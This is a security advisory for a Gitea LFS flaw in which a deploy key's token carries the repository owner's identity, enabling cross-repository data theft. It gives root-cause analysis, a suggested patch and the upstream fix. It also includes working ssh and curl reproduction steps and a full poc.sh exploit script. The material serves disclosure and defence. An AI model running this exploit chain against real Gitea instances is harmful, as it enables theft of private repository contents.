<!-- source: https://red.anthropic.com/2026/cvd/findings/ANT-2026-VN61PHA0 -->

# ANT-2026-VN61PHA0 · go-gitea/gitea

## idor medium

[CVE-2026-58435](https://nvd.nist.gov/vuln/detail/CVE-2026-58435)
[GHSA-rh79-75qm-gwjr](https://github.com/advisories/GHSA-rh79-75qm-gwjr)

Maintainer medium

Anthropic's analysis, sealed at approval. Disclosure to the maintainer was performed by Doyensec.

# ANT-2026-VN61PHA0: Gitea LFS Deploy-Key Privilege Escalation — Cross-Repository Data Exfiltration

Gitea's LFS server (`services/lfs/server.go`) blindly trusts the `UserID` embedded in LFS JWT tokens and uses it as `ctx.Doer` for **cross-repository** privilege decisions in `LFSObjectAccessible()`. When combined with the fact that `routers/private/serv.go` sets `UserID = repo.OwnerID` for **deploy keys**, a holder of a write-access deploy key on *any single repo* can exfiltrate LFS objects from *every repo* the repo owner has access to — and if the owner is a site admin, from every repo on the instance.

Deploy keys exist precisely to give narrow, single-repo access to CI/CD systems. This vulnerability completely defeats that isolation for LFS data.

**Project:** gitea
**Commit:** `cb95c8100fab6c96`
**Location:** `serv.go:275`

The root cause is a trust-boundary mismatch: serv.go treats the JWT UserID as a cosmetic attribution label (setting it to repo.OwnerID for deploy keys at line 275), while server.go treats it as the authenticated principal for authorization decisions. The JWT correctly pins RepoID (checked at line 609), but LFSObjectAccessible at line 268 deliberately consults other repositories using the claimed user's permissions — and for deploy keys that claimed user is the repo owner, not the key holder. Additionally, line 613 only rejects Op!='upload' when mode==Write, so an upload-Op token is also valid for download.

This finding was identified by static analysis and has not yet been dynamically reproduced. The Technical Details section above describes the code path; a trigger input is not included.

This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by the Anthropic security team in collaboration with Anthropic Research. Please direct questions to security-cvd@anthropic.com and reference ANT-2026-VN61PHA0.

---

**Reference:** ANT-2026-VN61PHA0

Triage and disclosure were performed by Doyensec. The writeup below is the document the firm sent to the maintainer.

## Vulnerability Header

| Field | Value |
| --- | --- |
| Vulnerability Title | Gitea LFS Deploy-Key Privilege Escalation |
| Severity Rating | High |
| Bug Category | Insufficient Authorization |
| Location | `services/lfs/server.go:268`, `routers/private/serv.go:275` |
| Affected Versions | 1.25.5 |

## Executive Summary

Gitea's LFS server (`services/lfs/server.go:268`) uses the `UserID` embedded in an LFS JWT to make cross-repository authorization decisions via `LFSObjectAccessible()`. This would be safe if the JWT `UserID` always matched the actual requesting principal — but for deploy keys, `routers/private/serv.go:275` sets `UserID = repo.OwnerID` instead of any identity representing the deploy key itself. As a result, an attacker who holds a write deploy key for any single repo owned by a victim can obtain a legitimate JWT (via the standard SSH `git-lfs-authenticate` flow) that Gitea will honor as if the victim themselves were making the request. The attacker can then exfiltrate LFS objects from any private repo the victim owns — no admin credentials, no server secrets, no brute force required. If the victim is a site administrator, every LFS object on the entire Gitea instance is reachable. Deploy keys exist precisely to grant narrow, single-repo access to CI/CD systems; this vulnerability defeats that isolation entirely for LFS data.

## Root Cause Analysis

### Technical Description

The vulnerability is a **trust-boundary confusion** across two independent subsystems. When a deploy key authenticates over SSH, `serv.go` sets `UserID = repo.OwnerID` because the code has no better representation for a deploy key identity (a `FIXME` comment acknowledges this). That `UserID` is baked verbatim into the LFS JWT by `cmd/serv.go`. The JWT is then consumed by `server.go`, which treats `claims.UserID` as the authenticated principal and loads that user object as `ctx.Doer`. When the batch upload handler encounters an object that exists on disk but isn't yet linked to the target repo, it calls `LFSObjectAccessible(ctx, ctx.Doer, oid)` — a global query across all repos the claimed user can see — to decide whether to silently create the cross-repo link. The JWT's `RepoID` claim is verified (so the request is correctly scoped to one repo at the HTTP level), but the `UserID` driving the cross-repo access decision is the repo *owner*, not the deploy key. The attacker ends up holding a valid, server-signed token that impersonates the victim for any LFS authorization check.

### First Faulty Condition

The primary bug — where the JWT `UserID` is set incorrectly — is in `serv.go`:

| File | `routers/private/serv.go` |
| --- | --- |
| Line | 275 |
| Condition | Deploy key branch sets `results.UserID = repo.OwnerID`; the owner's UID is embedded in the JWT and later used as the authenticated principal for cross-repo privilege decisions in `server.go:268` |

```
// routers/private/serv.go:252–278
if key.Type == asymkey_model.KeyTypeDeploy {
    ...
    // FIXME: Deploy keys aren't really the owner of the repo pushing changes
    // however we don't have good way of representing deploy keys in hook.go
    // so for now use the owner of the repository
    results.UserName = results.OwnerName
    results.UserID = repo.OwnerID    // ← OWNER's UID, not the deploy key
    ...
```

The secondary bug — where the tainted `UserID` is actually misused — is in `server.go`:

| File | `services/lfs/server.go` |
| --- | --- |
| Line | 268 |
| Condition | `LFSObjectAccessible(ctx, ctx.Doer, oid)` makes a cross-repo decision using the JWT `UserID`, which for deploy keys is the repo owner, not the deploy key holder |

```
// services/lfs/server.go:267–275
if exists && meta == nil {
    accessible, err := git_model.LFSObjectAccessible(ctx, ctx.Doer, p.Oid)
    ...
    if accessible {
        _, err := git_model.NewLFSMetaObject(ctx, repository.ID, p)  // links OID to attacker's repo
        ...
```

**Admin amplification:** if `victim.IsAdmin`, `models/git/lfs.go:226` short-circuits with a bare `COUNT(*)` over the entire `lfs_meta_object` table — no repo filter. A deploy key on any admin-owned repo reaches every LFS object on the instance.

## Exploitability Assessment

### Attack Vector & Reachability

| Attack vector | Network |
| --- | --- |
| Authentication required | Low: attacker must hold a write deploy key's private key material for any of victim's repositories |
| User interaction required | None |
| Reachable in default config | No. Requires `LFS_START_SERVER = true` |
| Entry point(s) | SSH `git-lfs-authenticate` command + HTTP LFS batch API |

The practical exploitability of this vulnerability is constrained by a second prerequisite that is independent of the authorization bypass itself: the attacker must know the SHA-256 OID of a specific LFS object in the target repository. OIDs are 256-bit digests — not enumerable and not brute-forceable — and the LFS batch endpoint functions only as an existence oracle, not a listing mechanism. Successful exploitation therefore requires a prior information-disclosure path that exposes OIDs outside the repository boundary. Known paths include public forks that retain stale LFS pointer files in git history, former collaborators who retained object references from a prior `git pull`, and issue or pull request comments that reference pointer file contents.

LFS pointer files are committed in plaintext to git history, so anyone who ever cloned or had read access to the target repo retains all OIDs permanently. The attack is effectively a **post-revocation persistence** primitive — after a collaborator loses access, they can continue downloading updated versions of LFS files they previously knew existed.

### Reproduction Steps

**Environment**

The issue was reproduced using `gitea/gitea:1.25.5` docker image.

**Setup** (performed as victim/admin — represents normal deployment state)

```
# 1. Victim creates a private repo and uploads an LFS object
git clone http://victim:PASSWORD@localhost:3000/victim/secret-repo.git
cd secret-repo
git lfs track "*.bin"
echo "TOP SECRET: password is hunter2" > secret.bin
git add .gitattributes secret.bin && git commit -m "secret"
git push && git lfs push origin main

# Note the OID and size from:
git lfs pointer --file=secret.bin
# oid sha256:1d4fed31944373fcc761b70a2efc4a9731bc3a007c63ecee22ccd5b93bb6483b
# size 32

# 2. Victim creates ci-repo and registers a write deploy key
#    (via UI: ci-repo → Settings → Deploy Keys → Add Deploy Key → enable write access)
#    Attacker holds the corresponding private key (e.g. leaked from CI config)
```

**Exploit**

```
# Step 1 — Obtain JWT via SSH using only the deploy key (no victim credentials)
ssh -i ~/.ssh/deploy_key -p 2222 git@localhost \
  "git-lfs-authenticate victim/ci-repo upload"
# → {"header":{"Authorization":"Bearer eyJ..."},"href":"..."}
# Decode payload: {"RepoID":3,"Op":"upload","UserID":4,...}
#                                              ^^^^^^^^ victim's UID — BUG

JWT="eyJ..."
OID="1d4fed31944373fcc761b70a2efc4a9731bc3a007c63ecee22ccd5b93bb6483b"
SIZE=32

# Step 2 — Confirm attacker is blocked from secret-repo directly
curl -s -H "Authorization: Bearer $JWT" \
  "http://localhost:3000/victim/secret-repo.git/info/lfs/objects/$OID"
# → {"Message":"Unauthorized"}  — correctly blocked

# Step 3 — Batch upload to ci-repo claiming the secret OID
curl -s -X POST \
  -H "Authorization: Bearer $JWT" \
  -H "Accept: application/vnd.git-lfs+json" \
  -H "Content-Type: application/vnd.git-lfs+json" \
  "http://localhost:3000/victim/ci-repo.git/info/lfs/objects/batch" \
  -d "{\"operation\":\"upload\",\"transfers\":[\"basic\"],\"objects\":[{\"oid\":\"$OID\",\"size\":$SIZE}]}"
# → {"objects":[{"oid":"1d4fed...","size":32}]}  — NO "actions" field
#   server silently linked the OID to ci-repo without demanding proof of possession

# Step 4 — Download the secret via ci-repo
curl -s -H "Authorization: Bearer $JWT" \
  "http://localhost:3000/victim/ci-repo.git/info/lfs/objects/$OID"
# → TOP SECRET: password is hunter2
```

**Expected output**

```
Step 2:  {"Message":"Unauthorized"}          ← blocked from secret-repo
Step 3:  {"objects":[{"oid":"1d4fed...","size":32}]}  ← no actions = silently linked
Step 4:  TOP SECRET: password is hunter2     ← exfiltrated via ci-repo
```

**PoC files**

* `poc.sh` — end-to-end PoC using real SSH deploy key

## Recommended Fix

A proper fix might require significant architecture change. A short term recommendation is presented below:

**Fix 1 — `services/lfs/server.go:267` (defense in depth, immediately effective)**

Remove the `LFSObjectAccessible` cross-repo shortcut. Require proof of possession (the normal upload flow) for any object not already linked to the target repo. The JWT is correctly scoped to one `RepoID`; authorization decisions about *other* repos should not be made using the JWT `UserID`.

```
// BEFORE (vulnerable):
if exists && meta == nil {
    accessible, err := git_model.LFSObjectAccessible(ctx, ctx.Doer, p.Oid)
    if err != nil {
        log.Error("Unable to check if LFS MetaObject [%s] is accessible: %v", p.Oid, err)
        writeStatus(ctx, http.StatusInternalServerError)
        return
    if accessible {
        _, err := git_model.NewLFSMetaObject(ctx, repository.ID, p)
        if err != nil {
            log.Error("Unable to create LFS MetaObject [%s] for %s/%s. Error: %v", p.Oid, rc.User, rc.Repo, err)
            writeStatus(ctx, http.StatusInternalServerError)
            return
    } else {
        exists = false
```

```
// After (safe):
if exists && meta == nil {
    // Do not use ctx.Doer for cross-repo decisions — the JWT only authorizes
    // access to this repo. Always require proof-of-possession for objects
    // not already linked here.
    exists = false
```

The client will re-upload the bytes (which are hash-verified).
Performance cost: one redundant upload per cross-repo object. Security gain: the cross-repo trust boundary is enforced regardless of how the JWT was issued.

**Fix 2 — `routers/private/serv.go:275` (fix the source)**

Stop embedding `repo.OwnerID` in the JWT for deploy keys. Options:
- Add a `DeployKeyID` field to the JWT `Claims` struct; teach `handleLFSToken` to construct a minimal synthetic principal with exactly the deploy key's permissions (single-repo, mode-limited).
- Or mint a separate JWT type for deploy keys that `server.go` treats as repo-scoped only, refusing to use it for cross-repo operations.

Patch provenance: AI-generated + Human-reviewed

## References

* CWE-639: Authorization Bypass Through User-Controlled Key
* CWE-266: Incorrect Privilege Assignment

## Attribution

This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by Adrian Denkiewicz at Doyensec in collaboration with Anthropic Research.

For CVE credits and public acknowledgments: Doyensec in collaboration with Claude and Anthropic Research.

## Attachment: `fix1.patch`

```
diff --git a/services/lfs/server.go b/services/lfs/server.go
index 4f3bbe9eb5..aa81b2c828 100644
--- a/services/lfs/server.go
+++ b/services/lfs/server.go
@@ -265,22 +265,13 @@ func BatchHandler(ctx *context.Context) {

            if exists && meta == nil {
-               accessible, err := git_model.LFSObjectAccessible(ctx, ctx.Doer, p.Oid)
-               if err != nil {
-                   log.Error("Unable to check if LFS MetaObject [%s] is accessible. Error: %v", p.Oid, err)
-                   writeStatus(ctx, http.StatusInternalServerError)
-                   return
-               }
-               if accessible {
-                   _, err := git_model.NewLFSMetaObject(ctx, repository.ID, p)
-                   if err != nil {
-                       log.Error("Unable to create LFS MetaObject [%s] for %s/%s. Error: %v", p.Oid, rc.User, rc.Repo, err)
-                       writeStatus(ctx, http.StatusInternalServerError)
-                       return
-                   }
-               } else {
-                   exists = false
-               }
+               // Do not use ctx.Doer for cross-repository access decisions.
+               // The JWT authorizes access to this repository only; using
+               // LFSObjectAccessible here allows a deploy-key JWT (which
+               // carries the repo owner's UserID rather than the key's own
+               // identity) to silently link LFS objects from other private
+               // repositories. Require proof of possession instead.
+               exists = false

            responseObject = buildObjectResponse(rc, p, false, !exists, err)
```

## Attachment: `poc.sh`

```
#!/bin/bash
################################################################################
# PoC: Gitea LFS Deploy-Key Privilege Escalation
#
# REQUIRED SETUP (manual — not automated here):
#
#   1. Gitea with LFS_START_SERVER=true and SSH enabled
#
#   2. Two repos owned by the same victim user:
#        victim/repo-no-deploy-key  — PRIVATE, contains LFS objects (the target)
#        victim/ci-repo             — any visibility, has a write deploy key registered
#
#   3. LFS content must be uploaded to repo-no-deploy-key:
#        git clone http://victim:PASS@HOST/victim/repo-no-deploy-key.git
#        cd repo-no-deploy-key && git lfs track "*.bin"
#        echo "TOP SECRET: password is hunter2" > secret.bin
#        git add .gitattributes secret.bin && git commit -m "secret"
#        git push && git lfs push origin main
#
#   4. The private key corresponding to the write deploy key on ci-repo must be
#      available locally (DEPLOY_KEY_FILE below).
#
#   5. OID and SIZE must be set to the LFS object in repo-no-deploy-key:
#        git lfs pointer --file=secret.bin
#
# ATTACKER'S POSITION:
#   - Holds private key of a write deploy key on victim/ci-repo
#   - Has NO credentials for victim's Gitea account
#   - Has NO access to victim/repo-no-deploy-key
################################################################################

set -e

# ---------------------------------------------------------------------------
# CONFIGURATION — adjust to match your environment
# ---------------------------------------------------------------------------
GITEA_HOST="localhost"
GITEA_SSH_PORT="2222"
GITEA_HTTP="http://localhost:3000"

DEPLOY_KEY_FILE="$HOME/.ssh/deploy-key"   # private key for ci-repo deploy key
VICTIM_USER="victim"
CI_REPO="ci-repo"           # repo the deploy key is registered on
SECRET_REPO="repo-no-deploy-key"   # private repo to exfiltrate from (no deploy key)

OID="1d4fed31944373fcc761b70a2efc4a9731bc3a007c63ecee22ccd5b93bb6483b"
SIZE=32
# ---------------------------------------------------------------------------

echo ""
echo "================================================================================"
echo " PoC3: Gitea LFS Deploy-Key Privilege Escalation"
echo "================================================================================"

echo ""
echo "--------------------------------------------------------------------------------"
echo "[1] Obtain LFS JWT via SSH using only the deploy key"
echo ""
echo "  ssh -i $DEPLOY_KEY_FILE -p $GITEA_SSH_PORT git@$GITEA_HOST \\"
echo "    'git-lfs-authenticate $VICTIM_USER/$CI_REPO upload'"
echo ""

SSH_OUT=$(ssh -i "$DEPLOY_KEY_FILE" -p "$GITEA_SSH_PORT" \
  -o StrictHostKeyChecking=no -o BatchMode=yes \
  git@"$GITEA_HOST" "git-lfs-authenticate $VICTIM_USER/$CI_REPO upload")

echo "  Raw SSH output: $SSH_OUT"

JWT=$(echo "$SSH_OUT" | python3 -c \
  "import sys,json; print(json.load(sys.stdin)['header']['Authorization'].split(' ')[1])")

echo ""
echo "  JWT: $JWT"
echo ""

# Decode and display claims
CLAIMS=$(echo "$JWT" | cut -d. -f2 | python3 -c "
import sys, base64, json
p = sys.stdin.read().strip()
p += '=' * (-len(p) % 4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(p)), indent=2))
")
echo "  JWT claims:"
echo "$CLAIMS" | sed 's/^/    /'
echo ""

JWT_USER_ID=$(echo "$CLAIMS" | python3 -c "import sys,json; print(json.load(sys.stdin)['UserID'])")
echo "  UserID in JWT: $JWT_USER_ID"
echo ""
echo "  ^^^ This should be the VICTIM's UID (repo.OwnerID), NOT a deploy-key UID."
echo "      routers/private/serv.go:275: results.UserID = repo.OwnerID  ← BUG"

echo ""
echo "--------------------------------------------------------------------------------"
echo "[2] Confirm attacker is BLOCKED from repo-no-deploy-key directly"
echo ""

R=$(curl -s -w '|%{http_code}' \
  -H "Authorization: Bearer $JWT" \
  "$GITEA_HTTP/$VICTIM_USER/$SECRET_REPO.git/info/lfs/objects/$OID")
HTTP="${R##*|}"
BODY="${R%|*}"
echo "  GET $GITEA_HTTP/$VICTIM_USER/$SECRET_REPO.git/info/lfs/objects/$OID"
echo "  HTTP $HTTP: $BODY"
if [ "$HTTP" = "200" ]; then
  echo "  ERROR: direct access succeeded — repo-no-deploy-key may not be private!"
  exit 1
fi
echo "  → Correctly blocked (deploy key has no access to $SECRET_REPO)"

echo ""
echo "--------------------------------------------------------------------------------"
echo "[3] Batch 'upload' to ci-repo claiming the secret OID"
echo ""
echo "  The JWT is scoped to ci-repo (RepoID check passes)."
echo "  server.go sees the OID exists on disk, not linked to ci-repo, then calls:"
echo "  LFSObjectAccessible(ctx, victim, oid) — a GLOBAL query across all victim repos."
echo "  Finds OID in repo-no-deploy-key → TRUE → links OID to ci-repo. No proof demanded."
echo ""

BATCH_RESP=$(curl -s -X POST \
  -H "Authorization: Bearer $JWT" \
  -H "Accept: application/vnd.git-lfs+json" \
  -H "Content-Type: application/vnd.git-lfs+json" \
  "$GITEA_HTTP/$VICTIM_USER/$CI_REPO.git/info/lfs/objects/batch" \
  -d "{\"operation\":\"upload\",\"transfers\":[\"basic\"],\"objects\":[{\"oid\":\"$OID\",\"size\":$SIZE}]}")

echo "  Response: $BATCH_RESP"
echo ""

HAS_ACTIONS=$(echo "$BATCH_RESP" | python3 -c \
  "import sys,json; print('yes' if json.load(sys.stdin)['objects'][0].get('actions') else 'no')" 2>/dev/null)

if [ "$HAS_ACTIONS" = "yes" ]; then
  echo "  EXPLOIT FAILED at step 3: server returned actions (proof of possession demanded)."
  echo "  LFS content may not have been uploaded to repo-no-deploy-key. Check setup."
  exit 1
fi
echo "  ^^^ No 'actions' field — server silently linked the OID to $CI_REPO."
echo "      Contrast: a non-privileged JWT gets actions:[upload,verify] (proof demanded)."

echo ""
echo "--------------------------------------------------------------------------------"
echo "[4] Download secret content from ci-repo using the deploy-key JWT"
echo ""

STOLEN=$(curl -s \
  -H "Authorization: Bearer $JWT" \
  "$GITEA_HTTP/$VICTIM_USER/$CI_REPO.git/info/lfs/objects/$OID")
HTTP=$(curl -s -o /dev/null -w '%{http_code}' \
  -H "Authorization: Bearer $JWT" \
  "$GITEA_HTTP/$VICTIM_USER/$CI_REPO.git/info/lfs/objects/$OID")

echo "  GET $GITEA_HTTP/$VICTIM_USER/$CI_REPO.git/info/lfs/objects/$OID"
echo "  HTTP $HTTP"
echo "  >>> STOLEN: $STOLEN"

echo ""
echo "================================================================================"
echo " VERDICT"
echo "================================================================================"
echo ""
echo "  Attack chain:"
echo "  1. ssh -i deploy_key → JWT{UserID=$JWT_USER_ID} (victim impersonated by serv.go)"
echo "  2. Direct access to $SECRET_REPO → BLOCKED ($HTTP_DIRECT)"
echo "  3. Batch upload to $CI_REPO with OID from $SECRET_REPO → silently linked"
echo "  4. Download from $CI_REPO → HTTP $HTTP"
echo ""

if [ "$HTTP" = "200" ]; then
  echo "  *** VULNERABILITY CONFIRMED (end-to-end, no JWT forging) ***"
  echo ""
  echo "  A write deploy key scoped to $CI_REPO was used to exfiltrate LFS"
  echo "  content from $SECRET_REPO, which the deploy key has no access to."
  echo "  No server secrets were used — only the deploy key's private key material."
  echo ""
  echo "  Stolen: '$STOLEN'"
  exit 0
else
  echo "  EXPLOIT FAILED — HTTP $HTTP, got: $STOLEN"
  exit 1
fi
```

UPSTREAM FIX

The change that resolved this finding.

```
diff --git a/services/lfs/server.go b/services/lfs/server.go
index 6340b06252141..8c7de2ccb655b 100644
--- a/services/lfs/server.go
+++ b/services/lfs/server.go
@@ -254,6 +254,17 @@ func BatchHandler(ctx *context.Context) {

 		var responseObject *lfs_module.ObjectResponse
 		if isUpload {
+			if exists && meta == nil {
+				// The object exists in the content store but is not linked to this
+				// repo. Do not auto-link it based on cross-repo access: the token
+				// only authorizes this repo, and for deploy keys ctx.Doer is the
+				// repo owner, so trusting it here would let a single-repo key pull
+				// objects from any repo the owner can see. Require proof of
+				// possession by making the client upload the (hash-verified) bytes,
+				// and treat it as a new upload for size-limit enforcement below.
+				exists = false
+			}
+
 			var err *lfs_module.ObjectError
 			if !exists && setting.LFS.MaxFileSize > 0 && p.Size > setting.LFS.MaxFileSize {
 				err = &lfs_module.ObjectError{
@@ -262,25 +273,6 @@ func BatchHandler(ctx *context.Context) {

-			if exists && meta == nil {
-				accessible, err := git_model.LFSObjectAccessible(ctx, ctx.Doer, p.Oid)
-				if err != nil {
-					log.Error("Unable to check if LFS MetaObject [%s] is accessible. Error: %v", p.Oid, err)
-					writeStatus(ctx, http.StatusInternalServerError)
-					return
-				}
-				if accessible {
-					_, err := git_model.NewLFSMetaObject(ctx, repository.ID, p)
-					if err != nil {
-						log.Error("Unable to create LFS MetaObject [%s] for %s/%s. Error: %v", p.Oid, rc.User, rc.Repo, err)
-						writeStatus(ctx, http.StatusInternalServerError)
-						return
-					}
-				} else {
-					exists = false
-				}
-			}
-
 			responseObject = buildObjectResponse(rc, p, false, !exists, err)
 		} else {
 			var err *lfs_module.ObjectError
@@ -337,13 +329,17 @@ func UploadHandler(ctx *context.Context) {

 	uploadOrVerify := func() error {
 		if exists {
-			accessible, err := git_model.LFSObjectAccessible(ctx, ctx.Doer, p.Oid)
-			if err != nil {
-				log.Error("Unable to check if LFS MetaObject [%s] is accessible. Error: %v", p.Oid, err)
+			// The bytes already exist in the content store. Only skip proof of
+			// possession when the object is already linked to *this* repo; never
+			// trust cross-repo access (ctx.Doer is the repo owner for deploy keys),
+			// which would let a caller link an object it cannot produce.
+			meta, err := git_model.GetLFSMetaObjectByOid(ctx, repository.ID, p.Oid)
+			if err != nil && err != git_model.ErrLFSObjectNotExist {
+				log.Error("Unable to get LFS MetaObject [%s]. Error: %v", p.Oid, err)
 				return err
-			if !accessible {
-				// The file exists but the user has no access to it.
+			if meta == nil {
+				// The file exists but is not linked to this repo.
 				// The upload gets verified by hashing and size comparison to prove access to it.
 				hash := sha256.New()
 				written, err := io.Copy(hash, ctx.Req.Body)
diff --git a/tests/integration/api_repo_lfs_test.go b/tests/integration/api_repo_lfs_test.go
index 5dc8671e2aebd..0f65606017f61 100644
--- a/tests/integration/api_repo_lfs_test.go
+++ b/tests/integration/api_repo_lfs_test.go
@@ -240,9 +240,14 @@ func TestAPILFSBatch(t *testing.T) {
 			assert.Equal(t, "Size must be less than or equal to 2", br.Objects[0].Error.Message)
 		})

-		t.Run("AddMeta", func(t *testing.T) {
+		t.Run("CrossRepoObjectRequiresUpload", func(t *testing.T) {
 			defer tests.PrintCurrentTest(t)()

+			// An object whose bytes already exist in the store but which is not
+			// linked to this repo must not be silently linked, even when the
+			// caller can access it in another repo. Auto-linking let a deploy key
+			// (whose token carries the repo owner's identity) exfiltrate objects
+			// across repos without proving possession. The client must upload.
 			p := lfs.Pointer{Oid: "05eeb4eb5be71f2dd291ca39157d6d9effd7d1ea19cbdc8a99411fe2a8f26a00", Size: 6}

 			contentStore := lfs.NewContentStore()
@@ -250,6 +255,7 @@ func TestAPILFSBatch(t *testing.T) {
 			assert.NoError(t, err)
 			assert.True(t, exist)

+			// The object is linked to another repo owned by the same user.
 			repo2 := createLFSTestRepository(t, "lfs-batch2-repo")
 			storeObjectInRepo(t, repo2.ID, "dummy0")

@@ -266,11 +272,13 @@ func TestAPILFSBatch(t *testing.T) {
 			br := decodeResponse(t, resp.Body)
 			assert.Len(t, br.Objects, 1)
 			assert.Nil(t, br.Objects[0].Error)
-			assert.Empty(t, br.Objects[0].Actions)
+			// The client is told to upload instead of the object being linked.
+			assert.Contains(t, br.Objects[0].Actions, "upload")

+			// No meta object may have been created for this repo.
 			meta, err = git_model.GetLFSMetaObjectByOid(t.Context(), repo.ID, p.Oid)
-			assert.NoError(t, err)
-			assert.NotNil(t, meta)
+			assert.Nil(t, meta)
+			assert.Equal(t, git_model.ErrLFSObjectNotExist, err)

 			// Cleanup
 			err = contentStore.Delete(p.RelativePath())
```

<https://github.com/go-gitea/gitea/commit/66a3723cbb1d2224be9dc62483902b6b2df226c0>

1. 2026-03-30
2. 2026-05-07
3. 2026-07-07
4. 2026-07-12

792fb8eabe7a87b60f3e2d0dd223112d1c98a3a08735d4fed6c05796f6021939aab5dbf05b80c0a0dbbf9e3fb4d7dff530b824f32a837f35d8c97760ac460be9

Committed 2026-05-07 00:06 PT

Revealed 2026-08-17 10:47 PT

[Verify (download preimage.json)](data:application/json;charset=utf-8,%7B%22ant_id%22%3A%22ANT-2026-VN61PHA0%22%2C%22bug_class%22%3A%22IDOR%22%2C%22claude_severity%22%3A%22high%22%2C%22commit_sha%22%3A%22cb95c8100fab6c96%22%2C%22created_at%22%3A%222026-03-30T23%3A19%3A26%2B00%3A00%22%2C%22description%22%3A%22Gitea%27s%20LFS%20server%20%28%60services/lfs/server.go%60%29%20blindly%20trusts%20the%20%60UserID%60%20embedded%20in%20LFS%20JWT%20tokens%20and%20uses%20it%20as%20%60ctx.Doer%60%20for%20%2A%2Across-repository%2A%2A%20privilege%20decisions%20in%20%60LFSObjectAccessible%28%29%60.%20When%20combined%20with%20the%20fact%20that%20%60routers/private/serv.go%60%20sets%20%60UserID%20%3D%20repo.OwnerID%60%20for%20%2A%2Adeploy%20keys%2A%2A%2C%20a%20holder%20of%20a%20write-access%20deploy%20key%20on%20%2Aany%20single%20repo%2A%20can%20exfiltrate%20LFS%20objects%20from%20%2Aevery%20repo%2A%20the%20repo%20owner%20has%20access%20to%20%E2%80%94%20and%20if%20the%20owner%20is%20a%20site%20admin%2C%20from%20every%20repo%20on%20the%20instance.%5Cn%5CnDeploy%20keys%20exist%20precisely%20to%20give%20narrow%2C%20single-repo%20access%20to%20CI/CD%20systems.%20This%20vulnerability%20completely%20defeats%20that%20isolation%20for%20LFS%20data.%22%2C%22discovered_at%22%3Anull%2C%22location%22%3A%22serv.go%3A275%22%2C%22poc_sha256%22%3A%2246521d4e19c49eba7b8f1481658672703fd5774c21358a46644d0f3cccb03fb4%22%2C%22preimage_version%22%3A1%2C%22project%22%3A%22gitea%22%2C%22reproduction%22%3Anull%2C%22technical_details%22%3A%22The%20root%20cause%20is%20a%20trust-boundary%20mismatch%3A%20serv.go%20treats%20the%20JWT%20UserID%20as%20a%20cosmetic%20attribution%20label%20%28setting%20it%20to%20repo.OwnerID%20for%20deploy%20keys%20at%20line%20275%29%2C%20while%20server.go%20treats%20it%20as%20the%20authenticated%20principal%20for%20authorization%20decisions.%20The%20JWT%20correctly%20pins%20RepoID%20%28checked%20at%20line%20609%29%2C%20but%20LFSObjectAccessible%20at%20line%20268%20deliberately%20consults%20other%20repositories%20using%20the%20claimed%20user%27s%20permissions%20%E2%80%94%20and%20for%20deploy%20keys%20that%20claimed%20user%20is%20the%20repo%20owner%2C%20not%20the%20key%20holder.%20Additionally%2C%20line%20613%20only%20rejects%20Op%21%3D%27upload%27%20when%20mode%3D%3DWrite%2C%20so%20an%20upload-Op%20token%20is%20also%20valid%20for%20download.%22%2C%22title%22%3A%22Gitea%20LFS%20Deploy-Key%20Privilege%20Escalation%20%E2%80%94%20Cross-Repository%20Data%20Exfiltration%22%2C%22vendor_severity%22%3A%22high%22%7D)

```
  "ant_id": "ANT-2026-VN61PHA0",
  "bug_class": "IDOR",
  "commit_sha": "cb95c8100fab6c96",
  "created_at": "2026-03-30T23:19:26+00:00",
  "description": "Gitea's LFS server (`services/lfs/server.go`) blindly trusts the `UserID` embedded in LFS JWT tokens and uses it as `ctx.Doer` for **cross-repository** privilege decisions in `LFSObjectAccessible()`. When combined with the fact that `routers/private/serv.go` sets `UserID = repo.OwnerID` for **deploy keys**, a holder of a write-access deploy key on *any single repo* can exfiltrate LFS objects from *every repo* the repo owner has access to — and if the owner is a site admin, from every repo on the instance.\n\nDeploy keys exist precisely to give narrow, single-repo access to CI/CD systems. This vulnerability completely defeats that isolation for LFS data.",
  "location": "serv.go:275",
  "poc_sha256": "46521d4e19c49eba7b8f1481658672703fd5774c21358a46644d0f3cccb03fb4",
  "project": "gitea",
  "technical_details": "The root cause is a trust-boundary mismatch: serv.go treats the JWT UserID as a cosmetic attribution label (setting it to repo.OwnerID for deploy keys at line 275), while server.go treats it as the authenticated principal for authorization decisions. The JWT correctly pins RepoID (checked at line 609), but LFSObjectAccessible at line 268 deliberately consults other repositories using the claimed user's permissions — and for deploy keys that claimed user is the repo owner, not the key holder. Additionally, line 613 only rejects Op!='upload' when mode==Write, so an upload-Op token is also valid for download.",
  "title": "Gitea LFS Deploy-Key Privilege Escalation — Cross-Repository Data Exfiltration",
```
